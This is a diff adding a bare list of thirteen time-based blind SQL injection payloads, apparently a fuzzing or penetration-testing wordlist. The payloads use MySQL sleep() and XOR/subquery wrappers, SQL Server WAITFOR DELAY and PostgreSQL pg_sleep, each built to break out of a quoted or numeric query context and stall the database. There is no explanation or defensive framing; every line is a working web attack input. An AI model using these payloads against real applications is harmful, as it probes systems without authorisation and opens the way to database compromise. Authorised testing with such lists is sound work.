@@ -1,0 +1,13 @@
+XOR(if(now()=sysdate(),sleep(10),0))OR'
+if(now()=sysdate(),sleep(10),0)
+(select(0)from(select(sleep(10)))v)/*' (select(3)from(select(sleep(10)))v) '" (select(0)from(select(sleep(10)))v) "*/
+'XOR(if(now()=sysdate(),sleep(10*1),0))XOR'Z
+1 AND (SELECT * FROM (SELECT(SLEEP(10)))YYYY) AND '7='
+1'XOR(if(now()=sysdate(),sleep(10),0))OR'
+1 AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY)-1337
+1 or sleep(10)#
+' WAITFOR DELAY '0:0:10'--
+7;SELECT PG_SLEEP(10)--
+pg_sleep(10)
+'||pg_sleep(10)--
+'+(select*from(select(if(1=1,sleep(10),false)))a)+'
